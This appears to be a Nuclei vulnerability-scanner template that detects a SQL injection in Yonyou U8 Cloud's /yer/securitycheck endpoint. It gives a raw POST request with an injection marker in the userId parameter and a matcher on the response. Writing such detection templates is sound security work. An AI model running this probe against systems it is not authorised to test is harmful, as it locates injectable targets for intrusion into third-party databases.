id: yongyou-u8-cloud-securitycheck-sql

info:
  name: yongyou-u8-cloud-securitycheck-sql
  author: yongyou-u8-cloud-securitycheck-sql
  severity: critical

http:
  - raw:
      - |
        POST /yer/securitycheck HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Method: POST /yer/core HTTP/1.1
        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
        Content-Length: 12
        Connection: close

        userId=1*

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"3$%E7%99","EF%BC%81")'